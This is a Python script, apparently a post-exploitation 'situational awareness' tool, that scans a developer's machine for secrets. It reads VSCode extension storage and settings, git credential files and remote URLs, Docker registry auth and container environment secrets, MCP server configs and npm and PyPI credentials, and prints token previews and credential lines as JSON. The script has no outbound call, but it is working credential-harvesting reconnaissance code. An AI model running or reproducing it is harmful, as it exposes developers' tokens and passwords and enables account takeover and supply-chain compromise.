#!/usr/bin/env python3
"""Phase 2 Situational Awareness — Development Environment Scanner.
Enumerates IDEs, VSCode extensions (with token storage), Git configs,
Docker images (secrets in layers), package manager caches, MCP configs."""

import os
import sys
import json
import glob
import re
import platform
import subprocess
from pathlib import Path

HOME = Path.home()
SYSTEM = platform.system()
RESULTS = {"host": os.uname().nodename, "sections": {}}

# ── 1. IDE Detection ──
def detect_ides():
    ides = []
    ide_indicators = {
        "vscode": [
            HOME / ".vscode", HOME / ".config" / "Code",
            HOME / "Library" / "Application Support" / "Code",
            Path("/usr/bin/code"), Path("/usr/local/bin/code"),
        ],
        "jetbrains_idea": [HOME / ".IntelliJIdea*", HOME / ".config" / "JetBrains" / "IntelliJIdea*"],
        "jetbrains_pycharm": [HOME / ".PyCharm*", HOME / ".config" / "JetBrains" / "PyCharm*"],
        "jetbrains_webstorm": [HOME / ".WebStorm*", HOME / ".config" / "JetBrains" / "WebStorm*"],
        "vim": [HOME / ".vimrc", HOME / ".vim"],
        "neovim": [HOME / ".config" / "nvim", HOME / ".local" / "share" / "nvim"],
        "sublime": [HOME / ".config" / "sublime-text-3", HOME / "Library" / "Application Support" / "Sublime Text"],
        "emacs": [HOME / ".emacs", HOME / ".emacs.d"],
        "cursor": [HOME / ".cursor", HOME / "Library" / "Application Support" / "Cursor"],
    }
    for ide, paths in ide_indicators.items():
        for p in paths:
            if "*" in str(p):
                matches = glob.glob(str(p))
                if matches:
                    ides.append({"ide": ide, "path": matches[0]})
                    break
            elif p.exists():
                ides.append({"ide": ide, "path": str(p)})
                break
    return ides

# ── 2. VSCode Extensions (token hunters) ──
def scan_vscode_extensions():
    result = {"extensions": [], "tokens_found": []}
    ext_dirs = [
        HOME / ".vscode" / "extensions",
        HOME / ".vscode-server" / "extensions",
        HOME / ".cursor" / "extensions",
    ]
    token_patterns = [
        r'(?i)(?:api[_-]?key|token|secret|password|credential)\s*[=:]\s*["\']([^"\']{'+'8,})["\']',
    ]
    for ext_dir in ext_dirs:
        if not ext_dir.exists():
            continue
        for ext in sorted(ext_dir.iterdir()):
            if ext.is_dir():
                pkg_json = ext / "package.json"
                ext_info = {"name": ext.name}
                if pkg_json.exists():
                    try:
                        data = json.loads(pkg_json.read_text(errors='replace'))
                        ext_info["display_name"] = data.get("displayName", "")
                        ext_info["version"] = data.get("version", "")
                    except (json.JSONDecodeError, OSError):
                        pass
                result["extensions"].append(ext_info)
                # Scan extension storage for tokens
                for storage_file in ext.rglob("*.json"):
                    try:
                        content = storage_file.read_text(errors='replace')[:10000]
                        for pat in token_patterns:
                            matches = re.findall(pat, content)
                            for m in matches:
                                result["tokens_found"].append({
                                    "extension": ext.name, "file": str(storage_file.relative_to(ext)),
                                    "token_preview": m[:12] + "..." + m[-4:] if len(m) > 16 else m
                                })
                    except (PermissionError, OSError):
                        pass
    # VSCode settings with tokens
    settings_paths = [
        HOME / ".config" / "Code" / "User" / "settings.json",
        HOME / "Library" / "Application Support" / "Code" / "User" / "settings.json",
    ]
    for sp in settings_paths:
        if sp.exists():
            try:
                content = sp.read_text(errors='replace')[:20000]
                for pat in token_patterns:
                    matches = re.findall(pat, content)
                    for m in matches:
                        result["tokens_found"].append({
                            "source": "vscode_settings", "file": str(sp),
                            "token_preview": m[:12] + "..."
                        })
            except (PermissionError, OSError):
                pass
    return result

# ── 3. Git Configs (repos, remotes, tokens) ──
def scan_git_comprehensive():
    result = {"global_config": {}, "credentials": [], "repos": []}
    # Global config
    gitconfig = HOME / ".gitconfig"
    if gitconfig.exists():
        try:
            content = gitconfig.read_text(errors='replace')
            result["global_config"]["content"] = content[:2000]
            if "credential" in content.lower():
                result["global_config"]["has_credential_helper"] = True
        except (PermissionError, OSError):
            pass
    # .git-credentials
    for cred_file in [HOME / ".git-credentials", HOME / ".config" / "git" / "credentials"]:
        if cred_file.exists():
            try:
                lines = cred_file.read_text(errors='replace').strip().split("\n")
                result["credentials"] = [l[:100] for l in lines if l.strip()]
            except (PermissionError, OSError):
                pass
    # Discover git repos (limit depth)
    search_dirs = [HOME / "Desktop", HOME / "Documents", HOME / "projects",
                   HOME / "repos", HOME / "code", HOME / "src", Path("/opt"),
                   Path("/var/www"), Path("/srv")]
    for d in search_dirs:
        if not d.exists():
            continue
        try:
            for git_dir in d.rglob(".git"):
                if not git_dir.is_dir():
                    continue
                repo_dir = git_dir.parent
                repo_info = {"path": str(repo_dir)}
                # Get remotes
                config_path = git_dir / "config"
                if config_path.exists():
                    try:
                        cfg = config_path.read_text(errors='replace')
                        remotes = re.findall(r'url\s*=\s*(.+)', cfg)
                        repo_info["remotes"] = [r.strip() for r in remotes]
                        # Check for embedded tokens in remote URLs
                        for r in remotes:
                            if "@" in r and ":" in r.split("@")[0]:
                                repo_info["has_embedded_creds"] = True
                    except (PermissionError, OSError):
                        pass
                result["repos"].append(repo_info)
                if len(result["repos"]) >= 50:
                    return result
        except (PermissionError, OSError):
            pass
    return result

# ── 4. Docker (images, configs, secrets in layers) ──
def scan_docker():
    result = {"available": False}
    docker_config = HOME / ".docker" / "config.json"
    if docker_config.exists():
        try:
            data = json.loads(docker_config.read_text())
            result["registries"] = list(data.get("auths", {}).keys())
            result["cred_store"] = data.get("credsStore")
        except (json.JSONDecodeError, OSError):
            pass
    try:
        proc = subprocess.run(["docker", "images", "--format", "{{.Repository}}:{{.Tag}} {{.Size}}"],
                              capture_output=True, text=True, timeout=10)
        if proc.returncode == 0:
            result["available"] = True
            result["images"] = [l.strip() for l in proc.stdout.strip().split("\n") if l.strip()][:30]
        # Check for secrets in env vars of containers
        proc2 = subprocess.run(["docker", "ps", "--format", "{{.ID}} {{.Names}}"],
                               capture_output=True, text=True, timeout=10)
        if proc2.returncode == 0 and proc2.stdout.strip():
            containers = [l.split() for l in proc2.stdout.strip().split("\n") if l.strip()]
            result["running_containers"] = []
            for parts in containers[:10]:
                cid = parts[0]
                cname = parts[1] if len(parts) > 1 else cid
                env_proc = subprocess.run(["docker", "inspect", "--format", "{{json .Config.Env}}", cid],
                                          capture_output=True, text=True, timeout=5)
                if env_proc.returncode == 0:
                    try:
                        envs = json.loads(env_proc.stdout)
                        secret_envs = [e for e in envs if re.search(
                            r'(?i)(key|secret|token|password|credential)', e.split('=')[0])]
                        result["running_containers"].append(
                            {"name": cname, "secret_env_count": len(secret_envs),
                             "secret_envs": [e[:60] for e in secret_envs[:5]]})
                    except json.JSONDecodeError:
                        pass
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    return result

# ── 5. MCP Server Configs ──
def scan_mcp_configs():
    result = {"configs": []}
    mcp_locations = [
        HOME / ".claude" / "mcp.json",
        HOME / ".config" / "claude" / "mcp.json",
        HOME / ".cursor" / "mcp.json",
        HOME / ".config" / "Code" / "User" / "settings.json",
    ]
    for mcp_path in mcp_locations:
        if mcp_path.exists():
            try:
                content = mcp_path.read_text(errors='replace')[:10000]
                # Look for API keys
                keys_found = re.findall(
                    r'(?i)(?:api[_-]?key|token|secret|auth)"?\s*[=:]\s*"([^"]+)"', content)
                result["configs"].append({
                    "path": str(mcp_path),
                    "size": mcp_path.stat().st_size,
                    "api_keys_found": len(keys_found),
                    "key_previews": [k[:8] + "..." for k in keys_found[:5]]
                })
            except (PermissionError, OSError):
                pass
    return result

# ── 6. Package Manager Caches (tokens in lock files, registries) ──
def scan_package_managers():
    result = {}
    # npm
    npmrc = HOME / ".npmrc"
    if npmrc.exists():
        try:
            content = npmrc.read_text(errors='replace')
            tokens = re.findall(r'//[^:]+:_authToken=(.+)', content)
            result["npm"] = {"npmrc": True, "tokens": len(tokens),
                            "registries": re.findall(r'registry\s*=\s*(\S+)', content)}
        except (PermissionError, OSError):
            pass
    # pip/pypi
    pypirc = HOME / ".pypirc"
    if pypirc.exists():
        try:
            content = pypirc.read_text(errors='replace')
            result["pypi"] = {"pypirc": True, "has_password": "password" in content.lower(),
                             "preview": content[:300]}
        except (PermissionError, OSError):
            pass
    # yarn
    yarnrc = HOME / ".yarnrc.yml"
    if yarnrc.exists():
        try:
            content = yarnrc.read_text(errors='replace')
            result["yarn"] = {"config": True, "preview": content[:300]}
        except (PermissionError, OSError):
            pass
    # cargo
    cargo_creds = HOME / ".cargo" / "credentials"
    if cargo_creds.exists():
        result["cargo"] = {"credentials": True}
    return result

# ── Run all ──
for name, fn in [("ides", detect_ides), ("vscode", scan_vscode_extensions),
                  ("git", scan_git_comprehensive), ("docker", scan_docker),
                  ("mcp_configs", scan_mcp_configs), ("package_managers", scan_package_managers)]:
    try:
        RESULTS["sections"][name] = fn()
    except Exception as e:
        RESULTS["sections"][name] = {"error": str(e)}

print(json.dumps(RESULTS, indent=2, default=str))
print(f"\n[*] Dev environment scan complete — {len(RESULTS['sections'])} sections")
for k, v in RESULTS["sections"].items():
    if isinstance(v, list):
        print(f"  {k}: {len(v)} items")
    elif isinstance(v, dict) and "error" not in v:
        print(f"  {k}: {sum(1 for val in v.values() if val)} non-empty fields")

